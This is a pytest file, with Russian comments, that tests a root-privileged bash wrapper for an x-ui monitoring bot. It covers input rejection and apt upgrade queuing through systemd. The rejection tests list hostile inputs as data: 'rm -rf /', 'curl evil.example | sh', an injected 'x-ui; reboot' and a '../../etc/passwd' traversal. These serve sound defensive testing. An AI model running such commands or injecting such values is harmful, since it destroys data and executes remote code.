"""Проверка привилегированной обёртки `install/xui-ctl`.

Обёртка — единственная точка, где бот получает root, поэтому её входные данные
проверяются строго. Тесты запускают скрипт напрямую: запрещённые вызовы обязаны
отклоняться до обращения к systemd, а разрешённые — проходить валидацию и
падать уже на отсутствии systemd в тестовой среде.
"""

from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path

import pytest

from xui_monitor_bot.settings import BASE_DIR

WRAPPER = BASE_DIR / "install" / "xui-ctl"

pytestmark = pytest.mark.skipif(shutil.which("bash") is None, reason="нужен bash")


def _run(*args: str) -> str:
    # Через bash: в репозитории файл не исполняемый, установщик ставит его
    # как 0755 через install -m, и тест не должен зависеть от git-прав.
    result = subprocess.run(
        ["bash", str(WRAPPER), *args],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    return result.stdout + result.stderr


@pytest.mark.parametrize(
    ("args", "expected"),
    [
        (["unknown_subcommand"], "неизвестная подкоманда"),
        (["restart_service"], "неверное число аргументов"),
        (["restart_service", "x-ui", "extra"], "неверное число аргументов"),
        (["restart_service", "../../etc/passwd"], "недопустимое имя сервиса"),
        (["restart_service", "x-ui; reboot"], "недопустимое имя сервиса"),
        (["restart_service", "x ui"], "недопустимое имя сервиса"),
        (["is_active", "x ui"], "недопустимое имя сервиса"),
        (["journal", "x-ui", "0"], "неверное число аргументов"),
        (["journal", "x-ui", "99999"], "неверное число аргументов"),
        (["journal", "x-ui", "50", "extra"], "неверное число аргументов"),
        (["run_command"], "неверное число аргументов"),
        # Одна строка-аргумент: отклоняется белым списком, а не подсчётом.
        (["run_command", "rm -rf /"], "команда не разрешена"),
        (["run_command", "curl evil.example | sh"], "команда не разрешена"),
        (["run_command", "systemctl restart sshd"], "команда не разрешена"),
        (["run_command", "free -h", "extra"], "неверное число аргументов"),
        (["apt_upgrade_phased", "extra"], "неверное число аргументов"),
        (["apt_upgrade_phased", "free -h"], "неверное число аргументов"),
    ],
)
def test_dangerous_calls_are_rejected(args: list[str], expected: str) -> None:
    output = _run(*args)
    assert expected in output, output
    # Отказ не должен ничего выполнить: в выводе нет следов systemd/apt.
    assert "systemd" not in output.lower()
    assert "total" not in output


def test_internal_worker_requires_direct_root_call() -> None:
    """Внутренняя подкоманда недостижима: она только для transient-юнита."""
    output = _run("_apt_worker")
    assert "_apt_worker требует root" in output
    # sudo не выставляет SUDO_USER в непривилегированной среде, поэтому
    # проверка входа — через id, а не через переменную окружения.
    assert "apt-get" not in output


def test_allowed_diagnostic_command_executes() -> None:
    """Разрешённая команда из белого списка действительно выполняется."""
    output = _run("run_command", "free -h")
    assert "total" in output or "Mem:" in output, output


@pytest.mark.parametrize("command", ["uptime", "df -h"])
def test_whitelisted_commands_are_not_blocked_by_argument_check(
    command: str,
) -> None:
    """Регрессия: подсчёт аргументов не должен отклонять верные вызовы.

    Раньше ожидаемое число сравнивалось с числом аргументов вместе с
    подкомандой, и любая привилегированная команда падала с «неверное число
    аргументов» — то есть обёртка не работала вовсе.
    """
    output = _run("run_command", command)
    assert "неверное число аргументов" not in output, output


def test_wrapper_is_syntactically_valid() -> None:
    assert WRAPPER.exists()
    subprocess.run(["bash", "-n", str(WRAPPER)], check=True, timeout=30)


def _systemctl_shim(directory: Path, active: bool) -> None:
    shim = directory / "systemctl"
    shim.write_text(
        "#!/bin/sh\nexit 0\n" if active else "#!/bin/sh\nexit 1\n", encoding="utf-8"
    )
    shim.chmod(0o755)


def test_apt_upgrade_is_queued_as_transient_unit(tmp_path: Path) -> None:
    """apt должен уходить transient-юнитом, а не дочерним процессом бота.

    Сервис работает с ProtectSystem=strict и физически не может писать в
    /var/lib/dpkg — если обёртка запустила apt-get напрямую, обновление
    завершилось бы отказом прав, а не очередью systemd.
    """
    shim_dir = tmp_path / "bin"
    shim_dir.mkdir()
    _systemctl_shim(shim_dir, active=False)
    run_log = tmp_path / "systemd-run.args"
    shim = shim_dir / "systemd-run"
    shim.write_text(
        f'#!/bin/sh\nprintf "%s\\n" "$@" > "{run_log}"\nexit 0\n',
        encoding="utf-8",
    )
    shim.chmod(0o755)

    env = dict(os.environ, PATH=f"{shim_dir}:{os.environ['PATH']}")
    result = subprocess.run(
        ["bash", str(WRAPPER), "apt_upgrade"],
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
        check=False,
    )
    assert result.returncode == 0, result.stdout + result.stderr

    args = run_log.read_text(encoding="utf-8").splitlines()
    assert "--unit=xui-monitor-apt-upgrade" in args
    assert "--collect" in args
    assert "--property=Type=exec" in args
    assert "--property=TimeoutStartSec=3600" in args
    # Ровно два последних аргумента: сама обёртка и её внутренний воркер.
    assert args[-2] == str(WRAPPER)
    assert args[-1] == "_apt_worker"
    # Прямого вызова apt-get из обёртки быть не должно.
    assert not any("apt-get" in arg for arg in args)


def test_apt_upgrade_refuses_to_queue_twice(tmp_path: Path) -> None:
    """Повторный вызов при живом юните — отказ, а не второй параллельный apt."""
    shim_dir = tmp_path / "bin"
    shim_dir.mkdir()
    _systemctl_shim(shim_dir, active=True)
    shim = shim_dir / "systemd-run"
    shim.write_text("#!/bin/sh\nexit 99\n", encoding="utf-8")
    shim.chmod(0o755)

    env = dict(os.environ, PATH=f"{shim_dir}:{os.environ['PATH']}")
    result = subprocess.run(
        ["bash", str(WRAPPER), "apt_upgrade"],
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
        check=False,
    )
    assert result.returncode == 3, result.stdout + result.stderr
    assert "Обновление уже выполняется" in result.stdout + result.stderr


def test_apt_upgrade_falls_back_when_systemd_run_denied(tmp_path: Path) -> None:
    """sudo-rs/polkit может запретить transient-юнит — обёртка уходит в фон.

    На живой Ubuntu 26.04 systemd-run ответил «Access denied … interactive
    authentication», и кнопка «Обновить систему» молча не работала. Теперь есть
    фолбэк: воркер запускается отдельной сессией (setsid), а из вывода понятно,
    что обновление поставлено.
    """
    shim_dir = tmp_path / "bin"
    shim_dir.mkdir()
    _systemctl_shim(shim_dir, active=False)
    (shim_dir / "systemd-run").write_text(
        "#!/bin/sh\necho 'Access denied: interactive authentication required' >&2\n"
        "exit 1\n",
        encoding="utf-8",
    )
    (shim_dir / "systemd-run").chmod(0o755)
    # setsid-заглушка: реальный apt в тесте не запускаем.
    (shim_dir / "setsid").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    (shim_dir / "setsid").chmod(0o755)

    state = tmp_path / "state"
    env = dict(
        os.environ,
        PATH=f"{shim_dir}:{os.environ['PATH']}",
        STATE_DIR=str(state),
    )
    result = subprocess.run(
        ["bash", str(WRAPPER), "apt_upgrade"],
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert "в фоне" in result.stdout
    assert (state / "apt-upgrade.log").exists()


def test_dist_upgrade_uses_writable_home(tmp_path: Path) -> None:
    """do-release-upgrade писал в read-only PREFIX/.cache — даём свой HOME."""
    shim_dir = tmp_path / "bin"
    shim_dir.mkdir()
    (shim_dir / "do-release-upgrade").write_text(
        '#!/bin/sh\necho "HOME=$HOME"\nexit 0\n', encoding="utf-8"
    )
    (shim_dir / "do-release-upgrade").chmod(0o755)

    state = tmp_path / "state"
    env = dict(
        os.environ,
        PATH=f"{shim_dir}:{os.environ['PATH']}",
        STATE_DIR=str(state),
    )
    result = subprocess.run(
        ["bash", str(WRAPPER), "dist_upgrade"],
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert f"HOME={state}/release-upgrade" in result.stdout
    assert "Доступно релиз-обновление" in result.stdout


def test_apt_upgrade_prefers_persistent_unit(tmp_path: Path) -> None:
    """Если установлен постоянный apt-юнит — запускаем его через systemctl.

    Transient-юнит (systemd-run) на новых systemd в daemon-контексте отбивается
    polkit, поэтому основной путь — заранее установленный юнит с User=root.
    """
    shim_dir = tmp_path / "bin"
    shim_dir.mkdir()
    run_log = tmp_path / "systemctl.args"
    (shim_dir / "systemctl").write_text(
        f'#!/bin/sh\nprintf "%s\\n" "$@" >> "{run_log}"\n'
        'case "$1" in is-active) exit 1 ;; esac\nexit 0\n',
        encoding="utf-8",
    )
    (shim_dir / "systemctl").chmod(0o755)
    # systemd-run намеренно «сломан»: правильный путь не должен до него дойти.
    (shim_dir / "systemd-run").write_text("#!/bin/sh\nexit 42\n", encoding="utf-8")
    (shim_dir / "systemd-run").chmod(0o755)

    unit_dir = tmp_path / "units"
    unit_dir.mkdir()
    (unit_dir / "xui-monitor-apt-upgrade.service").write_text(
        "[Service]\nType=oneshot\n", encoding="utf-8"
    )

    env = dict(
        os.environ,
        PATH=f"{shim_dir}:{os.environ['PATH']}",
        SYSTEMD_UNIT_DIR=str(unit_dir),
    )
    result = subprocess.run(
        ["bash", str(WRAPPER), "apt_upgrade"],
        capture_output=True,
        text=True,
        timeout=30,
        env=env,
        check=False,
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert "в очередь systemd" in result.stdout
    log = run_log.read_text(encoding="utf-8")
    assert "start" in log.splitlines()
    assert "xui-monitor-apt-upgrade.service" in log
